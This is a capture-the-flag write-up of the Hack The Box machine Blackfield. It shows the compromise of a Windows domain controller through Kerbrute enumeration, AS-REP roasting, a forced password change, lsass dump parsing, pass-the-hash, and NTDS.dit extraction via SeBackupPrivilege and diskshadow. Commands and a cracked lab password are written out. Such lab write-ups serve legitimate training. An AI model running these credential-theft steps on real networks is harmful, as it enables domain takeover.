---
title: "[HARD] HTB-Blackfield"
draft: false
tags:
  - htb
  - windows
  - active-directory
  - kerbrute
  - getnpusers
  - getuserspns
  - as-rep-roasting
  - bloodhound
  - forcechangepassword
  - lsass-dmp
  - sebackupprivilege
  - pypykatz
  - secretsdump
  - ntds-dit
---
## Information Gathering
### Rustscan

Based on the ports open, this looked like a classic Active Directory server.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/blackfield]
└─$ rustscan --addresses 10.10.10.192 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛
<snip>
Open 10.10.10.192:53
Open 10.10.10.192:88
Open 10.10.10.192:135
Open 10.10.10.192:389
Open 10.10.10.192:445
Open 10.10.10.192:593
Open 10.10.10.192:3268
Open 10.10.10.192:5985
Open 10.10.10.192:64771
```

### Nmap

Nmap discovered domain name which I added to /etc/hosts.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/blackfield]
└─$ sudo nmap -sVC -p 53,88,135,389,445,593,3268,5985 10.10.10.192   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-31 21:14 EDT
Nmap scan report for DC01 (10.10.10.192)
Host is up (0.37s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-01 08:11:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-01T08:11:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h56m40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.04 seconds
```

## Enumeration
### SMB - TCP 445

Crackmapexec discoverd domain name which I already added to /etc/host files:

`10.10.10.192	DC01	DC01.BLACKFIELD.local	BLACKFIELD.local	BLACKFIELD`

![](https://i.imgur.com/y0jXgBt.png)


Luckily, SMB null login was allowed:

`smbclient -N -L 10.10.10.192`

![](https://i.imgur.com/F1zdV0V.png)


Null user had access to **profiles$** but all the other shares' access was denied.

On **profiles$** share, there were bunch of usernames:

![](https://i.imgur.com/uiBO68n.png)


I saved it to profile.txt

![](https://i.imgur.com/D6EKrw8.png)


Using **awk**, I made a list of accounts to username.txt

![](https://i.imgur.com/VbwOPLO.png)


**usernames.txt** is created and I decided to enumerate other services first before moving on to AS-REP Roasting of Kerbruting.

![](https://i.imgur.com/4NbS4gB.png)


### LDAP - TCP 389

Ldapsearch confirmed the base namingcontexts:

`ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts`

![](https://i.imgur.com/eOk2VUz.png)


I tried null binding to the base but it was not allowed:

`ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFILED,DC=LOCAL"`

![](https://i.imgur.com/ynza9dU.png)


### RPC - TCP 135

RPC also required credentials for querying:

![](https://i.imgur.com/Aw4xCLU.png)

## Access as support
### Kerbrute

Since I spent enough time on enumeration and nothing really showed up other than potential username, I moved on to Kerbruting.

Using Kerbrute, I can filter out valid username from KDC:

`./kerbrute_linux_amd64 userenum -d BLACKFIELD.LOCAL --dc DC01.BLACKFIELD.LOCAL ~/Documents/htb/blackfield/username.txt`

![](https://i.imgur.com/QpBalN7.png)


Kerbrute found three users: **audit2020**, **support**, and **svc_backup**.

More interestingly, user support seemed to be vulnerable to **AS-REP Roasting**

### AS-REP Roasting

Using **GetNPUsers.py**, I can obtain hashcat crackable hash for user **suport**:

`GetNPUsers.py -no-pass -dc-ip 10.10.10.192 BLACKFIELD.LOCAL/support`

![](https://i.imgur.com/XXqEPjD.png)


### Hash Cracking

Using hashcat, I cracked the password and credentials were obtained -> **support**:**#00^BlackKnight**

`haschat -m 18200 hash.asreproast rockyou.txt`

### Kerberoasting - Failed

I tried Kerberoasting with the found credentials but it didn't work:

`GetUserSPNs.py BLACKFIELD.LOCAL/support:'#00^BlackKnight' -dc-ip DC01.BLACKFIELD.LOCAL -request`

![](https://i.imgur.com/JpK64VF.png)


### SMB - SYSVOL & NETLOGON

I hoped user support had access to winrm but unfortunately it didn't:

![](https://i.imgur.com/CIh1EgV.png)


However, it had access to SMB:

![](https://i.imgur.com/b6XIKNT.png)


I was able to access **SYSVOL** share as support and it had **BLACKFIELD.local** directory inside:

![](https://i.imgur.com/nfknkZo.png)


I recursively downloaded everything:

![](https://i.imgur.com/iNdGodp.png)


All the files were in Policies folder but none of those files had password keyword inside of it:

![](https://i.imgur.com/IkvFdnx.png)


**NETLOGON** share was empty:

![](https://i.imgur.com/4wccSza.png)


## Access as audit2020
### Bloodhound

Since all the enumeration done as user **support** returned nothing useful, I moved on to **Bloodhound** so I can enumerate Active Directory.

I first ran bloodhound-python to obtain json files with domain information:

`sudo python bloodhound.py -u support -p '#00^BlackKnight' -c ALL -ns 10.10.10.192 -d BLACKFIELD.LOCAL`

![](https://i.imgur.com/OrbM62b.png)


I started neo4j console and bloodhound using the commands below:

```bash
sudo neo4j console
bloodhound
```

I drag and dropped json files and first marked user support as owned:

![](https://i.imgur.com/UubIeDZ.png)


Checking on **Outbound Object Control**, there was one **First Degree Object Control** for user support:

![](https://i.imgur.com/QGgg30F.png)


User SUPPORT@BLACKFIELD.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.

![](https://i.imgur.com/LfBlfop.png)


### ForceChangePassword for audit2020

Bloodhound provided me with guide on how to abuse this vulnerability but following this guide somehow didn't work for me:

![](https://i.imgur.com/WiCrQLg.png)


Instead, I signed-in to RPC as support and changed the password for audit2020:

`setuserinfo2 audit2020 23 Password123!`

![](https://i.imgur.com/biiez7k.png)

## Shell as svc_backup
### SMB - Forensic

I tried Evil-Winrm as **audit2020** with the changed password but it didn't work. It seemed that audit2020 wasn't in winrm group. 

However, audit2020 did had an access to **forensic** share:

`smbclient //10.10.10.192/forensic -U audit2020%'Password123!'`

![](https://i.imgur.com/dPnjEN1.png)


Again, I recursively downloaded everything:

![](https://i.imgur.com/lZhyTDi.png)


In **memory_analysis** folder, there was one zip file that looked interesting: **lsass.zip**.

I unzipped the file to obtain **lsass.DMP** file:

`sudo unzip lsass.zip`

![](https://i.imgur.com/y8bCYDx.png)


Using **pypykatz**, I was able to extract password hashes from the DMP file:

![](https://i.imgur.com/IZsMx0B.png)


I had NT hash for both **svc_backup** and **Administrator**:

![](https://i.imgur.com/AUHrKZJ.png)


![](https://i.imgur.com/M31NXSz.png)


Unfortunately, for some reason passing the hash for administrator didn't work:

![](https://i.imgur.com/Rw7Yb4U.png)


However, passing the hash for **svc_backup** gave me a shell:

![](https://i.imgur.com/H4oFW95.png)


## Privesc:svc_backup to Administrator
### SeBackupPrivilege

Listing privilege that **svc_backup** had with `whoami /priv`, I saw **SeBackupPrivilege** which is a really strong privilege.

![](https://i.imgur.com/KEIHVdd.png)


**SeBackUpPrivilege** basically allows for full system read and user **svc_backup** had this privilege because it was the member of **Backup Operator Group**:

![](https://i.imgur.com/DozVdcU.png)

By abusing this privilege, I can dump password hashes by downloading **SAM**,**SYSTEM**, and **NTDS.dit** file locally.

| File Name    | Description                                                                             | Location                                                |
|--------------|-----------------------------------------------------------------------------------------|---------------------------------------------------------|
| SAM          | Security Account Manager database storing user account information and password hashes | `%SystemRoot%\system32\config` directory on Windows    |
| SYSTEM       | Windows registry file containing encryption keys and security-related data              | `%SystemRoot%\system32\config` directory on Windows    |
| NTDS.dit     | Active Directory Database storing directory objects, including user account hashes      | `%SystemRoot%\NTDS` directory on domain controllers    |
### Execution

I used reg command to save registry key for **SAM** and **SYSTEM** saved it to Temp directory:



![](https://i.imgur.com/znviqNn.png)


  

![](https://i.imgur.com/xe26VNo.png)


  
  



After downloading **SAM** and **SYSTEM** to local side, I can use **pypykatz** to extract password hashes.



  

**PyPykatz** is a Python library for parsing and manipulating credentials from Windows Security Account Manager (SAM) files, and I can use this to get password hashes:



![](https://i.imgur.com/CUuYe9C.png)


  




Unfortunately, passing the above hash to crackmapexec didn't work out.

  

### Extracting NTDS.dit

Creating a Distributed Shell File (dsh file) that contains all the commands required by Diskshadow to run and create a full copy of our Windows Drive, from which I can then extract the ntds.dit file. I moved to the Kali Linux shell and created a dsh file. In this file, I instructed Diskshadow to create a copy of the C: Drive into a Z Drive with "jadu" as its alias. After creating this dsh file, I used **unix2dos** to convert the encoding and spacing of the dsh file to one that is compatible with the Windows machine.



  

1.  Creating dsh file to copy C: drive:



![](https://i.imgur.com/RwYPl7o.png)


  



  

2.  Uploaded the dsh file and ran it to copy the disk:

  



![](https://i.imgur.com/pVOfMuo.png)


  



  

3.  Copied C drive into Z drive:

  



![](https://i.imgur.com/4DbBJv5.png)


  
  

Now using the commands below, I downloaded ntds.dit and relevant files to local machine:


```bash
reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system
```

 

Using secretsdump.py, I dumped all the password hashes:



![](https://i.imgur.com/RTvLaqu.png)


  

![](https://i.imgur.com/uvW12ys.png)


  

Now I have shell as administrator:



![](https://i.imgur.com/W36PuDv.png)

## Reference
- https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges
